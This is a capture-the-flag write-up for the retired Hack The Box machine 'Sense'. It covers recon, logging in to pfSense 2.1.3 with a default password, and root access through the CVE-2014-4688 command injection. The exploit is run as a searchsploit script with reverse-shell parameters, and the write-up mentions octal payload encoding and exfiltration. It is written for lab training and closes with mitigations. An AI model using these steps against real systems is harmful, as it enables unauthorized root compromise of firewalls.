---
machine: Sense
os: FreeBSD
difficulty: Easy
platform: Hack The Box
category: Infrastructure / FreeBSD
state: Retired
tags: [freebsd, pfsense, default-credentials, cve-2014-4688, command-injection]
---

# Sense — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Methodology notes; no flags or real credentials.

## TL;DR

The box is **pfSense 2.1.3** on FreeBSD. An exposed `system-users.txt` gives the username and hints at the company default password (`admin`/`pfsense` is the standard pair; here the user differs while the password stays factory-default). With a panel session, the command injection in `status_rrd_graph_img.php` (**CVE-2014-4688**) runs as **root**, because the WebGUI runs with those privileges.

## Recon

```bash
nmap -p- -sCV <IP> -oN nmap.txt
```

```text
80/tcp  open  http        lighttpd 1.4.35
443/tcp open  ssl/http    lighttpd 1.4.35
```

Port 80 redirects to 443, which serves a pfSense login.

```bash
feroxbuster -k -u https://<IP>/ -w /usr/share/wordlists/dirb/common.txt
```

```text
/system-users.txt
/changelog.txt
```

`system-users.txt` reveals the username and that the password is the company default (`pfsense`).

## Access

1. **Log in** at `https://<IP>/` with `<user>:pfsense`.
2. **Version**: the dashboard confirms `2.1.3-RELEASE` (FreeBSD 8.3), vulnerable to CVE-2014-4688.

## Escalation

The injection lives in the `graph` parameter of `status_rrd_graph_img.php` and is exploited with `searchsploit` or Metasploit:

```bash
searchsploit -m 43560
python3 43560.py --rhost <IP> --lhost <IP> --lport 4444 --username <user> --password pfsense
```

```text
id
uid=0(root) gid=0(wheel) groups=0(wheel)
```

The payload is **octal-encoded** to slip past the application's filter. There is no further escalation: the WebGUI already is root.

## Pitfalls

- **Lowercase username**: pfSense logins are case-sensitive even for the username.
- **No stdout**: the injection returns nothing; launch a reverse shell or exfiltrate over the network.
- **Self-signed certificate**: use `curl -k` or accept the exception.

## Lessons

- A firewall admin panel with a factory password is total compromise.
- "System users" files in the webroot are a gift to the attacker.
- A WebGUI running as root turns a command injection into direct root.
- Mitigation: change default credentials, update pfSense, and do not run the interface as root.
